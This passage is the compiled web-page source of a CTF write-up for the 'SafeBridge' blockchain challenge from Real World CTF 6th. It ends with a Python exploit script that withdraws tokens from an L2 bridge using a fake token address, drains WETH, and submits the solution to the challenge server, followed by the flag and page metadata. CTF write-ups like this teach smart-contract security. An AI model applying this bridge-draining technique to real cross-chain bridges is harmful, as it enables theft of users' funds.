punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"approve\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"L2_ERC20_BRIDGE\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2bridge \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"contract\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l2account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"L2_ERC20_BRIDGE\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"l2bridge_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2bridge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"withdraw\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"fake\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2weth \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"contract\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l2account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"L2_WETH\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"weth_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2weth\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"approve\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"L2_ERC20_BRIDGE\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2bridge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"withdraw\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"L2_WETH\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"assert\"}),\" challenge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"caller\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"isSolved\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"remote\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"HOST\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" PORT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"token?\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" TOKEN\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"action?\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'b\"3\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(a.p,{children:[\"Flag: \",(0,n.jsx)(a.code,{children:\"rwctf{yoU_draINED_BriD6E}\"})]})]})}}var b=f;return T;})();\n;return Component;","toc":[{"value":"SafeBridge (Blockchain, 17 Solves)","url":"#safebridge-blockchain-17-solves","depth":2},{"value":"Exploitation","url":"#exploitation","depth":3}],"frontMatter":{"readingTime":{"text":"7 min read","minutes":6.95,"time":417000,"words":1390},"slug":"real-world-ctf-6th/safebridge","fileName":"real-world-ctf-6th/safebridge.md","title":"Real World CTF 6th – SafeBridge","date":"2024-01-29T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["Real World CTF 6th","Blockchain","Web3","Smart Contract","Solidity","Cross Chain","Data Validation"],"summary":"Exploiting cross-chain bridge vulnerabilities to drain tokens from the bridge","canonical":"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/safebridge"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.17,"time":10200,"words":34},"slug":["yanhu"],"fileName":"yanhu.md","name":"Y4nhu1","avatar":"https://www.gravatar.com/avatar/c7c87623e6b9b0b704065239f08a451b?d=identicon&s=256","specialties":["Crypto"],"github":"https://github.com/YanhuiJessica","member":true,"description":"A cooing chicken.","order":6,"date":null}],"prev":{"title":"UofTCTF 2024 – Export Grade Cipher","date":"2024-01-15T00:00:00.000Z","draft":false,"authors":["wrth"],"tags":["UofTCTF 2024","Crypto","LFSR"],"summary":"Recover LFSR by using chosen plaintext in a faulty cipher","slug":"uoftctf-2024/export-grade-cipher"},"next":null},"__N_SSG":true}